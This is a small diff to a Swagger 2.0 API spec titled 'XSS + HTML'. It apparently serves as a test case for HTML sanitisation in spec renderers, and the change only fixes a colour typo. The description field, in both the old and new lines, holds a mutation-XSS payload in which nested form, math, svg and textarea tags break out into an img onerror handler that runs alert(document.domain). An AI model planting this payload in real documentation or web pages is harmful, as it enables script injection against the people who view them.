@@ -2,4 +2,4 @@ swagger: '2.0'
 info:
   title: XSS + HTML 
   description: |
-    <form><h1><font color="read">HTML injection</font><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
+    <form><h1><font color="red">HTML injection</font><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
